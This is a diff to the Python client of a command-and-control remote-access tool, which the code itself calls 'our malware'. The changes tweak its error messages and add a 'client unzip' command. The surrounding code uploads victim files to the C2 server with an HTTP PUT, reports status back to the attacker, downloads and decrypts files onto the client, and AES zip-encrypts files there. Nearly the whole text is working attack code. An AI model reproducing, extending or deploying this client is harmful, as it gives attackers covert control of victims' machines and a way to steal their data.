@@ -122,7 +122,7 @@ while True:
         except PermissionError:
             post_to_server(f"You have don't Permission to Access{directory}.\n")
         except OSError:
-            post_to_server("There was a Operation System Error on client.\n")
+            post_to_server("There was a OS Error on client.\n")
         # If not error, send the current directory to the server for using in Prompt
         else:
             post_to_server(getcwd(), CWD_RESPONSE)
@@ -163,7 +163,7 @@ while True:
                         fileHandle.write(cipher.decrypt(response.content))
 
                     # Notify us on the server that the file was downloaded
-                    post_to_server(f"{filename} is now Written on {client}.\n")
+                    post_to_server(f"{filename} is now Written in {filepath} on {client}.\n")
 
         # Exception Handling Common Errors maybe occurs
         except FileNotFoundError:
@@ -172,7 +172,7 @@ while True:
         except PermissionError:
             post_to_server(f"You don't have permission to download {filepath} on the {client}.\n")
         except OSError:
-            post_to_server(f"Unable to Access {filepath} on the {client}, Operation System Error.\n")
+            post_to_server(f"Unable to Access {filepath} on the {client}, OS Error.\n")
 
 
     # The client upload FILENAME command allows us to transfer a file to the c2 server from our connected client,
@@ -199,13 +199,16 @@ while True:
                 put(f"http://{C2_SERVER}:{PORT}{FILE_SEND}/{encryptedFilename}", data=encryptedFile, stream=True,
                     headers=HEADERS, proxies=PROXY)
 
+            # Notify us on the server that the file was downloaded
+            post_to_server(f"{filename} is now Uploaded to the {client}.\n")
+
         # Exception Handling Common Errors maybe occurs
         except FileNotFoundError:
             post_to_server(f"{filepath} is not found on the {client}.\n")
         except PermissionError:
             post_to_server(f"You don't have permission to Upload {filepath} from the {client}.\n")
         except OSError:
-            post_to_server(f"Unable to Access {filepath} on the {client}, Operation System Error.\n")
+            post_to_server(f"Unable to Access {filepath} on the {client}, OS Error.\n")
 
     elif command.startswith("client zip"):
         # Split out the filepath to download, and replace \ with /
@@ -228,14 +231,42 @@ while True:
                     post_to_server(f"{filepath} on {client} is a directory. only Files can be zip-encrypted. \n")
                 else:
                     zipFile.write(filepath, arcname=filename)
-                    post_to_server(f"{filepath} is now zip-encrypted on the {client}. \n")
+                    post_to_server(f"{filename} is now Zipped and Encrypted in {filepath} on the client. \n")
 
         except FileNotFoundError:
             post_to_server(f"{filepath} is not found on the {client}.\n")
         except PermissionError:
             post_to_server(f"You don't have permission to zip-encrypt {filepath} on the {client}.\n")
         except OSError:
-            post_to_server(f"Unable to Access {filepath} on the {client}, Operation System Error.\n")
+            post_to_server(f"Unable to Access {filepath} on the {client}, OS Error.\n")
+
+
+    # the 'client unzip FILE' command allows us to Unzip-Decrypt files on the client
+    elif command.startswith("client unzip"):
+        # Split out the filepath to download, and replace \ with /
+        filepath = get_third_item(command)
+
+        # If we got IndexError, start a new iteration of the wile loop
+        if filepath is None:
+            continue
+
+        # Return the basename(filename) from filepath
+        filename = path.basename(filepath)
+
+        # Unzip AES Encrypted file using pyzipper
+        try:
+            with AESZipFile(filepath) as zipFile:
+                zipFile.setpassword(ZIP_PASSWORD)
+                zipFile.extractall(path.dirname(filepath))
+                post_to_server(f"{filename} is now Unzipped and Decrypted in {filepath} on the client. \n")
+        # Handle Errors maybe Occurs
+        except FileNotFoundError:
+            post_to_server(f"{filepath} is not found on the {client}.\n")
+        except PermissionError:
+            post_to_server(f"You don't have permission to Unzip-Decrypt {filepath} on the {client}.\n")
+        except OSError:
+            post_to_server(f"Unable to Access {filepath} on the {client}, OS Error.\n")
+
 
 
     # the client Kill Command shutdown our malware
